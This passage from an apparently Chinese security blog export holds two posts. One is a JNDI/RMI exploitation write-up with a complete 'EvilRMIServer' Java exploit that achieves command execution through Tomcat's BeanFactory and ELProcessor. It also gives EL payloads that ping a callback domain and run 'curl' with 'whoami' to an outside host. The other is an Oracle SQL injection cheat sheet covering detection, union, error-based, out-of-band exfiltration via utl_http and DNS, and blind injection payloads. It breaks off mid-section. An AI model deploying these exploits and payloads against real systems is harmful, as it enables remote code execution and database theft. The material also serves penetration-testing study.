+<p><img src="/2021/08/24/java/%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84ldap+rmi/1/image-20210824112543578.png" alt="image-20210824112543578"></p>
+<p><img src="/2021/08/24/java/%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84ldap+rmi/1/image-20210824112842700.png" alt="image-20210824112842700"></p>
+<p><img src="/2021/08/24/java/%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84ldap+rmi/1/image-20210824112555709.png" alt="image-20210824112555709"></p>
+<p>2、 第二种是远程加载的方式 就是第二行代码</p>
+<p>也就是本地ClassLoader找不到这个类，最后通过 VersionHelper12.loadClass() 中 URLClassLoader 加载了远程class。本地不存在这个类，从codebase中获取。所以java.rmi.server.useCodebaseOnly不会限制JNDI Reference的利用，有影响的是高版本JDK中的这几个系统属性：</p>
+<ul>
+<li>com.sun.jndi.rmi.object.trustURLCodebase</li>
+<li>com.sun.jndi.cosnaming.object.trustURLCodebase</li>
+<li>com.sun.jndi.ldap.object.trustURLCodebase</li>
+</ul>
+<h3 id="0x02-关于codebase"><a href="#0x02-关于codebase" class="headerlink" title="0x02 关于codebase"></a>0x02 关于codebase</h3><p>Oracle官方关于Codebase的说明：<a href="https://docs.oracle.com/javase/1.5.0/docs/guide/rmi/codebase.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/1.5.0/docs/guide/rmi/codebase.html</a></p>
+<p>Codebase指定了Java程序在网络上远程加载类的路径。RMI机制中交互的数据是序列化形式传输的，但是传输的只是对象的数据内容，RMI本身并不会传递类的代码。当本地没有该对象的类定义时，RMI提供了一些方法可以远程加载类，也就是RMI动态加载类的特性。</p>
+<p>当对象发送序列化数据时，会在序列化流中附加上Codebase的信息，这个信息告诉接收方到什么地方寻找该对象的执行代码。Codebase实际上是一个URL表，该URL上存放了接收方需要的类文件。在大多数情况下，你可以在命令行上通过属性 java.rmi.server.codebase 来设置Codebase。</p>
+<p>例如，如果所需的类文件在Webserver的根目录下，那么设置Codebase的命令行参数如下（如果你把类文件打包成了jar，那么设置Codebase时需要指定这个jar文件）：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-Djava.rmi.server.codebase&#x3D;http:&#x2F;&#x2F;url:8080&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>当接收程序试图从该URL的Webserver上下载类文件时，它会把类的包名转化成目录，在Codebase 的对应目录下查询类文件，如果你传递的是类文件 com.project.test ，那么接受方就会到下面的URL去下载类文件： </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;url:8080&#x2F;com&#x2F;project&#x2F;test.class</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>我做了如下的测试 观看使用<code>marshalsec-0.0.3-SNAPSHOT-all.jar</code>这个jar包，在<code>javax.naming.spi.NamingManager#getObjectFactoryFromReference</code>这个方法的时候，ref参数的情况，第一张是使用jar包的。</p>
+<p>​    <img src="/2021/08/24/java/%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84ldap+rmi/1/image-20210824153434951.png" alt="image-20210824153434951"></p>
+<p>第二张使用如下代码：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilRMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Integer s = (<span class="keyword">int</span>) (Math.random() * <span class="number">1000</span>);</span><br><span class="line">        String ss = Integer.toString(s);</span><br><span class="line">        System.out.println(<span class="string">"[*]Evil RMI Server is Listening on port: 6666"</span>);</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry( <span class="number">6666</span>);</span><br><span class="line">        <span class="comment">// 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory</span></span><br><span class="line">        ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">"javax.el.ELProcessor"</span>, <span class="keyword">null</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="keyword">true</span>,<span class="string">"org.apache.naming.factory.BeanFactory"</span>,<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">// 强制将'x'属性的setter从'setX'变为'eval', 详细逻辑见BeanFactory.getObjectInstance代码</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"forceString"</span>, <span class="string">"x=eval"</span>));</span><br><span class="line">        <span class="comment">// 利用表达式执行命令</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"x"</span>, <span class="string">"\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd.exe', '/c', 'ping "</span>+ ss +<span class="string">".sec.v1rus.top']).start()\")"</span>));</span><br><span class="line">        System.out.println(<span class="string">"[*]Evil command: ping v1rus.top"</span>);</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(<span class="string">"Object"</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/24/java/%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84ldap+rmi/1/image-20210824153137624.png" alt="image-20210824153137624"></p>
+<p>可以看到，使用<code>marshalsec-0.0.3-SNAPSHOT-all.jar</code>是随便申明了一个ref类并且制定了basecode（classFactoryLocation字段）。</p>
+<p>会在这里执BeanFactory的方法。</p>
+<p><img src="/2021/08/24/java/%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84ldap+rmi/1/image-20210825160927544.png" alt="image-20210825160927544"></p>
+<p>气炸了 最后发现只能传一个参数进去。invoke传入的数组只有一个参数，还是String类型的。</p>
+<p><img src="/2021/08/24/java/%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84ldap+rmi/1/image-20210825162355416.png" alt="image-20210825162355416"></p>
+<p>所以断了juel包的构造链，只能传入ELProcess来执行代码。后来我为了将这个服务放在公网，必须知道和实现的方法：在启动服务器的时候，实际上需要运行两个服务器，也可以理解为开启两个端口：</p>
+<ul>
+<li>一个是远程对象本身；也就是数据端口</li>
+<li>一个是允许客户端下载远程对象引用的注册表；也就是服务端口 默认1099</li>
+</ul>
+<p>所以再加上随机数，代码如下，很烂：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RMISocketFactory;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilRMIServer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> String ss;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> String <span class="title">newNumber</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Integer s = (<span class="keyword">int</span>) (Math.random() * <span class="number">1000</span>);</span><br><span class="line">        ss = Integer.toString(s);</span><br><span class="line">        <span class="keyword">return</span> ss;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]Powered by v1rus"</span>);</span><br><span class="line">        System.out.println(<span class="string">"[*]Evil RMI Server is Listening on port: 6666"</span>);</span><br><span class="line">        RMISocketFactory.setSocketFactory(<span class="keyword">new</span> V1RMISocket());</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(xxxx);</span><br><span class="line">        System.setProperty(<span class="string">"java.rmi.server.hostname"</span>,<span class="string">"121.199.xxx.xxx"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="comment">// 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory</span></span><br><span class="line">            ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">"javax.el.ELProcessor"</span>, <span class="keyword">null</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="keyword">true</span>,<span class="string">"org.apache.naming.factory.BeanFactory"</span>,<span class="keyword">null</span>);</span><br><span class="line">            <span class="comment">// 强制将'x'属性的setter从'setX'变为'eval', 详细逻辑见BeanFactory.getObjectInstance代码</span></span><br><span class="line">            ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"forceString"</span>, <span class="string">"x=eval"</span>));</span><br><span class="line">            <span class="comment">// 利用表达式执行命令</span></span><br><span class="line">            ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"x"</span>, <span class="string">"\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd.exe', '/c', 'ping "</span>+ newNumber() +<span class="string">".sec.v1rus.top']).start()\")"</span>));</span><br><span class="line">            <span class="comment">//System.out.println("[*]Evil command: ping v1rus.top");</span></span><br><span class="line">            ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">            registry.bind(<span class="string">"Object"</span>, referenceWrapper);</span><br><span class="line">            Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">            registry.unbind(<span class="string">"Object"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.server.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">V1RMISocket</span> <span class="keyword">extends</span> <span class="title">RMISocketFactory</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Socket <span class="title">createSocket</span><span class="params">(String host, <span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Socket(host,port);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ServerSocket <span class="title">createServerSocket</span><span class="params">(<span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (port == <span class="number">0</span>)</span><br><span class="line">            port = xxxxx;<span class="comment">//不指定就随机</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ServerSocket(port);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>讲个小插曲：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &quot;\&quot;\&quot;.getClass()一般都是这样去获取类的  但是有个别的方式</span><br><span class="line"></span><br><span class="line">queryString&#x3D;aaa\u0027%2b#&#123;\u0022\u0022[\u0022class\u0022]&#125;%2b\u0027bbb</span><br><span class="line">which decodes to - queryString&#x3D;aaa&#39;+#&#123;&quot;&quot;[&quot;class&quot;]&#125;+&#39;bbb</span><br><span class="line"></span><br><span class="line">主要的就是&quot;&quot;[&quot;class&quot;]。</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x03-特地去找了一下jdbc-jep290的绕过"><a href="#0x03-特地去找了一下jdbc-jep290的绕过" class="headerlink" title="0x03 特地去找了一下jdbc jep290的绕过"></a>0x03 特地去找了一下jdbc jep290的绕过</h3><p>废话不多说直接上链</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">readObject:424, ObjectInputStream (java.io)</span><br><span class="line">unmarshalValue:322, UnicastRef (sun.rmi.server)</span><br><span class="line">invoke:174, UnicastRef (sun.rmi.server)</span><br><span class="line">getReference:-1, ReferenceWrapper_Stub (com.sun.jndi.rmi.registry)</span><br><span class="line">decodeObject:476, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">lookup:138, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">connect:624, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">setValue:91, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:722, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:568, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseRest:877, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:183, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:137, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:128, JSON (com.alibaba.fastjson)</span><br><span class="line">parseObject:201, JSON (com.alibaba.fastjson)</span><br><span class="line">main:9, FastTest1 (fastjson)</span><br></pre></td></tr></table></figure>
+
+<p>其实主要是在这个方法进入的，不像普通的bind,rebind操作（在远程引用层中客户端服务端两个交互的类分别是<code>RegistryImpl_Stub</code>和<code>RegistryImpl_Skel</code>，在服务端的<code>RegistryImpl_Skel</code>类中，向注册中心进行bind、rebind操作时均进行了readObject操作以此拿到Remote远程对象引用）这个是在准备decodeObject的时候，对远程对象进行一个获取的操作，才有了接下来的<code>java.io.ObjectInputStream#readObject</code>jep290的绕过：</p>
+<p><img src="/2021/08/24/java/%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84ldap+rmi/1/image-20210901112329971.png" alt="image-20210901112329971"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">serialFilter &#x3D; ObjectInputFilter.Config.getSerialFilter();</span><br></pre></td></tr></table></figure>
+
+<p>這個其實就是大名鼎鼎的 <a href="https://openjdk.java.net/jeps/290" target="_blank" rel="noopener">JEP290</a> 防禦機制</p>
+<p>想绕过：</p>
+<p>加载目标类：</p>
+<p>Class.forName Classloader.loadClass</p>
+<p>与ClassLoader.loadClass() 一个小小的区别是，forName() 默认会对类进行初始化，会执行类中的 static 代码块。而ClassLoader.loadClass() 默认并不会对类进行初始化，只是把类加载到了 JVM 虚拟机中。</p>
+<p>我们执行如下测试代码：</p>
+<p>先了解Java 中创建对象的方法大概有下面这七种：</p>
+<ul>
+<li>使用 new 关键字</li>
+<li>Class 类的 newInstance() 方法</li>
+<li>Constructor 类的 newInstance() 方法</li>
+<li>Object 对象的 clone 方法</li>
+<li>反序列化创建对象</li>
+<li>使用 Unsafe 类创建对象</li>
+<li>通过工厂方法返回对象，如：String str = String.valueOf(23); </li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;&quot;[&quot;class&quot;].forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;js&quot;).eval(&quot;var x&#x3D;new java.lang.ProcessBuilder;x.command([&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,&#39;ping &quot;+ &quot;2&quot;+ ss +&quot;.sec.v1rus.top&#39;]);x.start()&quot;)&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#&#123;&quot;1&quot;.getClass ().getClass ().getMethods()[0].invoke(&quot;&quot;.getClass (), &quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;new java.lang.ProcessBuilder[&#39;(java.lang.String[])&#39;]([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,&#39;curl http:&#x2F;&#x2F;192.168.*.*&#x2F;&#96;whoami&#96;&#39;]).start()&quot;)&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
+  <entry>
+    <title>Oracle注入总结/1</title>
+    <url>/2021/01/29/Oracle%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1/</url>
+    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>​    Orancle数据库常用于一些大型公司，通常都配合Java后端来使用。 现在所在的公司平时测试中也会惊颤刚看到Oracle注入的漏洞，所以总结一下注入的过程，从如何发现注入点到数据的获取。  之后希望能从注入点中拿到shell。</p>
+<h2 id="0x02-正片"><a href="#0x02-正片" class="headerlink" title="0x02 正片"></a>0x02 正片</h2><h3 id="第一步、-寻找并判断注入点"><a href="#第一步、-寻找并判断注入点" class="headerlink" title="第一步、 寻找并判断注入点"></a>第一步、 寻找并判断注入点</h3><h4 id="注意：-避免使用and-1-1这样的语句"><a href="#注意：-避免使用and-1-1这样的语句" class="headerlink" title="注意： 避免使用and 1=1这样的语句"></a>注意： 避免使用<code>and 1=1</code>这样的语句</h4><h5 id="数字型："><a href="#数字型：" class="headerlink" title="数字型："></a>数字型：</h5><p>数字型的注入和其他数据库时一样，构造<strong>加减乘除</strong>的条件来判断注入。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#通过 &lt;&gt; 来判断 相当于!&#x3D;</span><br><span class="line"></span><br><span class="line">?id&#x3D;1+and+1&lt;&gt;6--+ #返回为真 页面正常</span><br><span class="line">?id&#x3D;1+and+1&lt;&gt;1--+ #返回为假 页面异常</span><br><span class="line"></span><br><span class="line">#通过 加减法来判断</span><br><span class="line"></span><br><span class="line">?id&#x3D;1 #返回id,为1的内容</span><br><span class="line">?id&#x3D;2-1  #返回为1的内容</span><br><span class="line"></span><br><span class="line">#通过数据库报错来判断</span><br><span class="line"></span><br><span class="line">?id&#x3D;1 #返回为正常</span><br><span class="line">?id&#x3D;1&#x2F;0 #返回异常</span><br><span class="line"></span><br><span class="line"># 通过注释符来判断(多行注释:&#x2F;**&#x2F;,单行注释:--)</span><br><span class="line"></span><br><span class="line">?id&#x3D;1 #返回为正常</span><br><span class="line">?id&#x3D;1&#x2F;*v1rus*&#x2F; #也返回正常</span><br><span class="line"></span><br><span class="line">?id&#x3D;1 #返回为正常</span><br><span class="line">?id&#x3D;1--v1rus #也返回正常</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="字符型："><a href="#字符型：" class="headerlink" title="字符型："></a>字符型：</h5><p>字符型的注入和mysql差不多，存在闭合引用符号的问题，后续用单行注释解决剩下的单引号。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#通过&lt;&gt;来判断</span><br><span class="line"></span><br><span class="line">?name&#x3D;loecho&#39;+and+1&lt;&gt;6--+ #返回正常</span><br><span class="line">?name&#x3D;loecho&#39;+and+1&lt;&gt;1--+ #返回异常</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#使用字符串拼接符’||’，通过判断拼接符是否执行，从而判断是否存在注入</span><br><span class="line"></span><br><span class="line">?name&#x3D;lo&#39;||&#39;echo #返回正常    &#39;||user||&#39;</span><br><span class="line">?name&#x3D;lo&#39;||&#39;haha #返回异常</span><br></pre></td></tr></table></figure>
+
+<h3 id="第二步、-利用并查询数据"><a href="#第二步、-利用并查询数据" class="headerlink" title="第二步、 利用并查询数据"></a>第二步、 利用并查询数据</h3><p><strong><em>有回显的情况：</em></strong></p>
+<h4 id="1、-联合查询"><a href="#1、-联合查询" class="headerlink" title="1、 联合查询"></a>1、 联合查询</h4><p><strong>即利用union select将想要查询的数据显示在页面上</strong>，构造正常语句，成功执行SQL语句查询数据</p>
+<ul>
+<li>具体步骤如下:</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 01.先判断列数,同Mysql一样</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39;+order+by+4--+ #返回正常</span><br><span class="line">?id&#x3D;1&#39;+order+by+5--+ #提示报错</span><br><span class="line"></span><br><span class="line">得出结论数据为: 5 列</span><br><span class="line"></span><br><span class="line"># 02.然后对每一列的数据类型进行判断（可以使用null代替某些无法快速猜测出数据类型的位置），先默认每一列均为null，然后从第一列开始依次将null改为字符串，如果报错则说明该列是数字型，否则则是字符型。,同Mysql一样</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39;+union+select+user+null+null+null+from+dual--+ #查询当前用户名</span><br><span class="line">以此类推</span><br><span class="line"></span><br><span class="line"># 03. 利用select table_name from user_tables where rownum&#x3D;1获取表名（列名table数据同理）：</span><br><span class="line"></span><br><span class="line">select column_name from user_tab_columns where table_name&#x3D;&#39;TB_USER&#39; and rownum&#x3D;1（获取列名）</span><br><span class="line">select USER_ID from TB_USER where USER_ID&#x3D;1 and rownum&#x3D;1（获取数据）</span><br></pre></td></tr></table></figure>
+
+<h4 id="2、-报错注入"><a href="#2、-报错注入" class="headerlink" title="2、 报错注入"></a>2、 报错注入</h4><p><strong>构造报错语句，通过数据库报错来带出我们要查询的数据</strong>，常用的报错函数包括（upper函数大写转小写）</p>
+<ul>
+<li>XMLType()</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 中间为查询语句</span><br><span class="line"></span><br><span class="line">upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62)))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>dbms_xdb_version.checkin()</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 中间为查询语句</span><br><span class="line"></span><br><span class="line">upper(dbms_xdb_version.checkin((select user from dual)))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>ctxsys.drithsx.sn()</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 中间为查询内容</span><br><span class="line"></span><br><span class="line">upper(dbms_xdb_version.checkin((select user from dual)))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>ordsys.ord_dicom.getmappingxpath()</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 中间为查询内容</span><br><span class="line"></span><br><span class="line">ordsys.ord_dicom.getmappingxpath(user,user,user)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>dbms_utility.sqlid_to_sqlhash()</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 中间为查询内容</span><br><span class="line"></span><br><span class="line">dbms_utility.sqlid_to_sqlhash((select user from dual))</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong><em>无回显的情况：</em></strong></p>
+<h4 id="1、-oob外带数据（nc监听）"><a href="#1、-oob外带数据（nc监听）" class="headerlink" title="1、 oob外带数据（nc监听）"></a>1、 oob外带数据（nc监听）</h4><p>通过HTTP请求,或者DNSlog,来构造语句,如果目标出网,并且对数据库函数没有进行限制,就会实现攻击</p>
+<ul>
+<li>HTTP 请求外带数据</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and utl_http.request(&#39;http:&#x2F;&#x2F;ip:port&#x2F;&#39;||(select banner from sys.v_$version where rownum&#x3D;1))&#x3D;1--  查询指纹版</span><br><span class="line"></span><br><span class="line">and utl_http.request(&#39;http:&#x2F;&#x2F;ip:port&#x2F;&#39;%7C%7C(select SYS_CONTEXT (&#39;USERENV&#39;, &#39;CURRENT_USER&#39;)from dual))&#x3D;1 -- 查询环境</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">and%20 utl_http.request(&#39;http:&#x2F;&#x2F;ip:port&#x2F;&#39;%7c%7c (select user from dual))&#x3D;1-- 查询当前用户</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">and%20%20utl_http.request(%27http:&#x2F;&#x2F;ip:port&#x2F;%27%7c%7c(select%20instance_name%20from%20v$instance))&#x3D;1--查询具体内容</span><br><span class="line"></span><br><span class="line">and utl_http.request(&#39;http:&#x2F;&#x2F;ip:port&#x2F;&#39;||(select TABLE_NAME from all_tables where rownum&#x3D;1))&#x3D;1-- 查询所有数据表名</span><br><span class="line"></span><br><span class="line">select name from v$database;</span><br><span class="line"></span><br><span class="line">select instance_name from v$instance;</span><br><span class="line"></span><br><span class="line">1.查询所有数据库</span><br><span class="line"></span><br><span class="line">由于Oralce没有库名,只有表空间,所以Oracle没有提供数据库名称查询支持，只提供了表空间名称查询。</span><br><span class="line">select * from v$tablespace;--查询表空间(需要一定权限)</span><br><span class="line"></span><br><span class="line">2.查询当前数据库中所有表名</span><br><span class="line"></span><br><span class="line">select * from user_tables;</span><br><span class="line"></span><br><span class="line">3.查询指定表中的所有字段名</span><br><span class="line"></span><br><span class="line">select column_name from user_tab_columns where table_name &#x3D; &#39;table_name&#39;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4.查询指定表中的所有字段名和字段类型</span><br><span class="line"></span><br><span class="line">select column_name, data_type from user_tab_columns where table_name &#x3D; &#39;table_name&#39;;   &#x2F;&#x2F;具体的话加 and rownum &#x3D;  1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>DSNlog请求外带数据</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- UTL_HTTP.REQUEST</span><br><span class="line"></span><br><span class="line">select name from test_user where id &#x3D;1 union SELECT UTL_HTTP.REQUEST((select pass from test_user where id&#x3D;1)||&#39;.dnslog&#39;) FROM sys.DUAL;</span><br><span class="line"></span><br><span class="line">- DBMS_LDAP.INIT</span><br><span class="line"></span><br><span class="line">select name from test_user where id &#x3D;1 union SELECT DBMS_LDAP.INIT((select pass from test_user where id&#x3D;1)||&#39;.dnslog&#39;,80) FROM sys.DUAL;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- HTTPURITYPE </span><br><span class="line"></span><br><span class="line">select name from test_user where id &#x3D;1 union SELECT HTTPURITYPE((select pass from test_user where id&#x3D;1)||&#39;.dnslog&#39;).GETCLOB() FROM sys.DUAL;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- UTL_INADDR.GET_HOST_ADDRESS </span><br><span class="line"></span><br><span class="line">select name from test_user where id &#x3D;1 union SELECT UTL_INADDR.GET_HOST_ADDRESS((select pass from test_user where id&#x3D;1)||&#39;.dnslog&#39;) FROM sys.DUAL;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2、-基于布尔值的盲注"><a href="#2、-基于布尔值的盲注" class="headerlink" title="2、 基于布尔值的盲注"></a>2、 基于布尔值的盲注</h4><p>通过<strong>构造不同条件（正确or错误）</strong>,<strong>返回相应页面的不同</strong>,就形成了Bool值的注入</p>
+<ul>
+<li>通过 substr() decode() 函数的盲注(常用)</li>
+</ul>
+<p>先介绍一下decode的用法简化了if</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">decode(条件,值1,返回值1,值2,返回值2,...值n,返回值n,缺省值)    值1 就返回1</span><br><span class="line">decode(字段或字段的运算，值1，值2，值3）  条件为值几就返回几</span><br><span class="line"></span><br><span class="line">栗子：</span><br><span class="line">select decode(性别，男，1，0），decode(性别，女，1，0） from students 返回男女生的数量。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 按位截取数据,Bp俩个标记:第一个为截取位数,第二个为:所有字符:</span><br><span class="line"></span><br><span class="line">and+1&#x3D;(select+decode(substr((select user from dual),§1§,1),&#39;§S§&#39;,(1),0) from dual)--+ #查 user</span><br><span class="line"></span><br><span class="line">and+1&#x3D;(select decode(substr((select banner from sys.v_$version wher rownum&#x3D;1),1 ,1),&#39;S&#39;,(1),0) from dual)--+ # 查version </span><br><span class="line"></span><br><span class="line">and+1&#x3D;(select decode(substr((select table_name from user_tables where rownum&#x3D;1),§1§,1),&#39;§S§&#39;,(1),0) from dual)--+ # 查表名</span><br><span class="line"></span><br><span class="line">总结就是decode判断处用substr阶段出select返回的字符爆破。</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过 case、substr()、ascii() 函数的盲注</li>
+</ul>
